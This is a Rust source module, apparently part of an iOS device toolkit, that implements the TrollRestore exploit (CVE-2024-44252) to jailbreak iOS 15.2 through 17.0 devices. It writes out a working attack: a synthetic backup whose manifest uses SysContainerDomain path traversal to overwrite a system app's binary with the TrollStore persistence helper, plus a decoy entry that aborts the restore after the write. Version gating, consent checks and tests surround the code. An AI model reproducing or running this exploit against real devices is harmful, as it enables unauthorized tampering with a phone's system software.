//! TrollRestore (CVE-2024-44252): install the TrollStore persistence helper
//! over a system app on iOS 15.2-16.6.1, 16.7 RC (20H18), and 17.0.
//!
//! Ports JJTech0130's TrollRestore `trollstore.py`: stage the helper in a
//! synthetic mobilebackup2 backup whose manifest contains a SysContainerDomain
//! path traversal targeting the app's bundle directory, then restore it with
//! `crash_on_purpose` so the restore aborts right after the malicious write.

use std::path::PathBuf;

use legacy_ios_assets::{DeviceDatabase, ResourceId};
use legacy_ios_core::{
    CancellationSafety, DeviceSelector, OperationEvent, OperationId, OperationKind,
    OperationOutcome, OperationPhase, Soc, Udid,
};
use legacy_ios_services::{
    AppFilter, BackupEntry, BackupError, BackupRestoreOptions, DirectoryEntry, FileEntry,
    SparseBackup,
};
use serde::{Deserialize, Serialize};
use tracing::info;

use crate::{
    DeviceManager, KitError, OperationHandle, lease::DeviceLeaseRegistry,
    operation::OperationEmitter,
};

/// System app replaced by default, mirroring the reference tool's prompt.
pub const DEFAULT_APP: &str = "Tips";

const HELPER_RESOURCE: &str = "trollstore-persistence-helper";
const BACKUP_SOURCE: &str = "TrollRestore";
const EXPECTED_ABORT: &str = "crash_on_purpose";
const FIND_MY_ERROR: &str = "Find My";
const BUNDLE_APPLICATION_ROOT: &str = "/private/var/containers/Bundle/Application";

/// Whether TrollRestore supports this device, mirroring upstream's menu gate
/// at restore.sh (`device_proc >= 8` and the iOS version/build window).
pub fn trollrestore_support(
    product_type: &legacy_ios_core::ProductType,
    version: &str,
    build: &str,
) -> Result<(), KitError> {
    let profile = DeviceDatabase::bundled()
        .find_product(product_type)
        .ok_or_else(|| KitError::UnknownProduct(product_type.clone()))?;
    let supported = a9_or_newer(profile.soc()) && supported_version(version, build);
    if supported {
        Ok(())
    } else {
        Err(KitError::TrollRestoreUnsupported {
            product_type: product_type.to_string(),
            version: version.to_owned(),
            build: build.to_owned(),
        })
    }
}

fn a9_or_newer(soc: Soc) -> bool {
    // Every SoC older than A9 has a dedicated variant, so `Other` is newer.
    matches!(
        soc,
        Soc::A9 | Soc::A9x | Soc::A10 | Soc::A10x | Soc::A11 | Soc::Other(_)
    )
}

fn supported_version(version: &str, build: &str) -> bool {
    if version == "17.0" || build == "20H18" {
        // iOS 17.0 and the 16.7 RC.
        return true;
    }
    let mut parts = version.split('.');
    let major = parts.next().and_then(|part| part.parse::<u32>().ok());
    let minor = parts.next().and_then(|part| part.parse::<u32>().ok());
    match (major, minor) {
        (Some(15), Some(minor)) => minor >= 2,
        (Some(16), Some(minor)) => minor <= 6,
        _ => false,
    }
}

/// A resolved, consent-ready TrollRestore operation.
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize)]
pub struct TrollRestorePlan {
    id: OperationId,
    udid: Udid,
    app: String,
    app_uuid: String,
}

impl TrollRestorePlan {
    pub const fn id(&self) -> OperationId {
        self.id
    }

    pub fn udid(&self) -> &Udid {
        &self.udid
    }

    /// Bundle directory name of the replaced app, e.g. `Tips.app`.
    pub fn app(&self) -> &str {
        &self.app
    }

    pub fn app_uuid(&self) -> &str {
        &self.app_uuid
    }

    pub fn confirm_destructive(&self) -> TrollRestoreConsent {
        TrollRestoreConsent { plan: self.id }
    }
}

pub struct TrollRestoreConsent {
    plan: OperationId,
}

pub(crate) async fn plan(
    devices: &DeviceManager,
    udid: Udid,
    app: &str,
) -> Result<TrollRestorePlan, KitError> {
    let device = devices.find_normal(&udid).await?;
    let info = device.query_info().await?;
    trollrestore_support(
        info.product_type(),
        info.product_version(),
        info.build_version(),
    )?;
    let apps = device.list_apps(AppFilter::System).await?;
    let paths = apps.iter().filter_map(|app| app.path().map(str::to_owned));
    let (app, app_uuid) = resolve_app_path(paths, app)?;
    info!(app, uuid = app_uuid, "resolved TrollRestore target app");
    Ok(TrollRestorePlan {
        id: OperationId::new(uuid::Uuid::new_v4().as_u128()),
        udid,
        app,
        app_uuid,
    })
}

/// Find the removable system app named `requested` (case-insensitive, with or
/// without the `.app` suffix) among installation-proxy bundle paths, and
/// return its bundle directory name and container UUID.
fn resolve_app_path(
    paths: impl Iterator<Item = String>,
    requested: &str,
) -> Result<(String, String), KitError> {
    let requested = if requested.ends_with(".app") {
        requested.to_owned()
    } else {
        format!("{requested}.app")
    };
    for path in paths {
        let Some(name) = path.rsplit('/').next() else {
            continue;
        };
        if !name.eq_ignore_ascii_case(&requested) {
            continue;
        }
        let Some(container) = path
            .strip_prefix(BUNDLE_APPLICATION_ROOT)
            .and_then(|rest| rest.strip_prefix('/'))
            .and_then(|rest| rest.split('/').next())
            .filter(|uuid| !uuid.is_empty())
        else {
            return Err(KitError::TrollRestoreAppNotRemovable(requested));
        };
        return Ok((name.to_owned(), container.to_owned()));
    }
    Err(KitError::TrollRestoreAppNotFound(requested))
}

/// The synthetic backup records, ported field-for-field from trollstore.py.
fn backup_entries(app: &str, app_uuid: &str, helper: Vec<u8>) -> Vec<BackupEntry> {
    let traversal = format!(
        "SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/{app_uuid}/{app}"
    );
    let executable = app.strip_suffix(".app").unwrap_or(app);
    vec![
        BackupEntry::Directory(DirectoryEntry::new("", "RootDomain")),
        BackupEntry::Directory(DirectoryEntry::new("Library", "RootDomain")),
        BackupEntry::Directory(DirectoryEntry::new("Library/Preferences", "RootDomain")),
        BackupEntry::File(
            FileEntry::new("Library/Preferences/temp", "RootDomain", helper)
                .with_owner(33, 33)
                .with_inode(0),
        ),
        BackupEntry::Directory(DirectoryEntry::new("", traversal.clone()).with_owner(33, 33)),
        BackupEntry::File(
            FileEntry::new("", format!("{traversal}/{executable}"), Vec::new())
                .with_owner(33, 33)
                .with_inode(0),
        ),
        // Break the hard link between the staged helper and the app binary.
        BackupEntry::File(
            FileEntry::new(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                Vec::new(),
            )
            .with_owner(501, 501),
        ),
        // Abort the restore right after the malicious write.
        BackupEntry::File(FileEntry::new(
            "",
            concat!("SysContainerDomain-../../../../../../../..", "/crash_on_purpose"),
            Vec::new(),
        )),
    ]
}

pub(crate) fn spawn(
    devices: DeviceManager,
    leases: DeviceLeaseRegistry,
    plan: TrollRestorePlan,
    consent: TrollRestoreConsent,
    cache_root: PathBuf,
    work_directory: PathBuf,
) -> OperationHandle {
    let (emitter, handle) = OperationHandle::channel(32);
    tokio::spawn(async move {
        if let Err(error) = execute(
            &devices,
            &leases,
            &emitter,
            plan,
            consent,
            cache_root,
            work_directory,
        )
        .await
        {
            emitter.fail(error).await;
        }
    });
    handle
}

async fn execute(
    devices: &DeviceManager,
    leases: &DeviceLeaseRegistry,
    emitter: &OperationEmitter,
    plan: TrollRestorePlan,
    consent: TrollRestoreConsent,
    cache_root: PathBuf,
    work_directory: PathBuf,
) -> Result<(), KitError> {
    if consent.plan != plan.id {
        return Err(KitError::TrollRestoreConsentMismatch);
    }
    emitter
        .emit(OperationEvent::PhaseStarted {
            phase: OperationPhase::Preflight,
            cancellation: CancellationSafety::Immediate,
        })
        .await;
    let _lease = leases
        .acquire(DeviceSelector::Udid(plan.udid.clone()))
        .await;
    if emitter.is_cancelled() {
        return Ok(());
    }

    emitter
        .emit(OperationEvent::PhaseStarted {
            phase: OperationPhase::Downloading,
            cancellation: CancellationSafety::Immediate,
        })
        .await;
    let helper_path =
        crate::firmware::fetch_resource(&ResourceId::new(HELPER_RESOURCE), cache_root).await?;
    let helper = tokio::fs::read(&helper_path).await?;

    let backup = SparseBackup::new(backup_entries(&plan.app, &plan.app_uuid, helper));
    backup
        .write_to_directory(work_directory.join(BACKUP_SOURCE))
        .await?;

    emitter
        .emit(OperationEvent::PhaseStarted {
            phase: OperationPhase::Restoring,
            cancellation: CancellationSafety::UnsafeUntilPhaseEnds,
        })
        .await;
    let options = BackupRestoreOptions::default()
        .reboot(false)
        .copy_backup(false)
        .system_files(true);
    let result = devices
        .find_normal(&plan.udid)
        .await?
        .restore_backup(&work_directory, BACKUP_SOURCE, options)
        .await;
    match result {
        Ok(_) => {}
        Err(BackupError::Remote { description, .. }) if description.contains(EXPECTED_ABORT) => {
            // The restore aborts on the decoy entry; the payload is already in place.
            info!("device aborted the restore on crash_on_purpose as expected");
        }
        Err(BackupError::Remote { description, .. }) if description.contains(FIND_MY_ERROR) => {
            return Err(KitError::TrollRestoreFindMyEnabled);
        }
        Err(error) => return Err(error.into()),
    }
    if emitter.is_cancelled() {
        emitter
            .emit(OperationEvent::CancellationDeferred {
                phase: OperationPhase::Restoring,
            })
            .await;
    }

    emitter
        .emit(OperationEvent::PhaseStarted {
            phase: OperationPhase::Booting,
            cancellation: CancellationSafety::UnsafeUntilPhaseEnds,
        })
        .await;
    devices.find_normal(&plan.udid).await?.restart().await?;
    emitter
        .emit(OperationEvent::Completed {
            outcome: OperationOutcome {
                operation: OperationKind::Jailbreak,
                summary: format!(
                    "installed the TrollStore persistence helper into {} and rebooted the device",
                    plan.app
                ),
            },
        })
        .await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use legacy_ios_core::ProductType;

    use super::*;

    #[test]
    fn gates_supported_versions() {
        let iphone8 = ProductType::from("iPhone8,1"); // A9
        assert!(trollrestore_support(&iphone8, "15.2", "19C56").is_ok());
        assert!(trollrestore_support(&iphone8, "15.8.3", "19H386").is_ok());
        assert!(trollrestore_support(&iphone8, "16.0", "20A362").is_ok());
        assert!(trollrestore_support(&iphone8, "16.6.1", "20G81").is_ok());
        assert!(trollrestore_support(&iphone8, "16.7", "20H18").is_ok()); // RC
        assert!(trollrestore_support(&iphone8, "17.0", "21A329").is_ok());
    }

    #[test]
    fn rejects_unsupported_versions() {
        let iphone8 = ProductType::from("iPhone8,1");
        assert!(trollrestore_support(&iphone8, "15.1", "19B74").is_err());
        assert!(trollrestore_support(&iphone8, "16.7", "20H19").is_err());
        assert!(trollrestore_support(&iphone8, "17.0.1", "21A340").is_err());
        assert!(trollrestore_support(&iphone8, "14.8", "18H17").is_err());
    }

    #[test]
    fn rejects_pre_a9_devices() {
        let iphone6 = ProductType::from("iPhone7,2"); // A8
        assert!(trollrestore_support(&iphone6, "15.2", "19C56").is_err());
    }

    #[test]
    fn resolves_removable_system_apps() {
        let paths = vec![
            "/Applications/MobileSafari.app".to_owned(),
            "/private/var/containers/Bundle/Application/9F6E0C1E-0000-4000-8000-000000000000/Tips.app"
                .to_owned(),
        ];
        let (app, uuid) = resolve_app_path(paths.into_iter(), "tips").unwrap();
        assert_eq!(app, "Tips.app");
        assert_eq!(uuid, "9F6E0C1E-0000-4000-8000-000000000000");
    }

    #[test]
    fn rejects_missing_and_non_removable_apps() {
        let removable =
            vec!["/private/var/containers/Bundle/Application/9F6E0C1E/Books.app".to_owned()];
        assert!(matches!(
            resolve_app_path(removable.clone().into_iter(), "Tips"),
            Err(KitError::TrollRestoreAppNotFound(_))
        ));
        let fixed = vec!["/Applications/MobileSafari.app".to_owned()];
        assert!(matches!(
            resolve_app_path(fixed.into_iter(), "MobileSafari"),
            Err(KitError::TrollRestoreAppNotRemovable(_))
        ));
    }

    #[test]
    fn consent_is_bound_to_one_plan() {
        let plan = TrollRestorePlan {
            id: OperationId::new(1),
            udid: Udid::from("udid"),
            app: "Tips.app".to_owned(),
            app_uuid: "uuid".to_owned(),
        };
        assert_eq!(plan.confirm_destructive().plan, plan.id());
    }

    #[test]
    fn builds_the_reference_record_set() {
        let entries = backup_entries("Tips.app", "UUID", b"helper".to_vec());
        assert_eq!(entries.len(), 8);
        let names: Vec<String> = entries
            .iter()
            .map(|entry| format!("{}:{}", entry.domain(), entry.path()))
            .collect();
        assert_eq!(
            names,
            [
                "RootDomain:",
                "RootDomain:Library",
                "RootDomain:Library/Preferences",
                "RootDomain:Library/Preferences/temp",
                "SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/UUID/Tips.app:",
                "SysContainerDomain-../../../../../../../../var/backup/var/containers/Bundle/Application/UUID/Tips.app/Tips:",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp:",
                "SysContainerDomain-../../../../../../../../crash_on_purpose:",
            ]
        );
    }
}
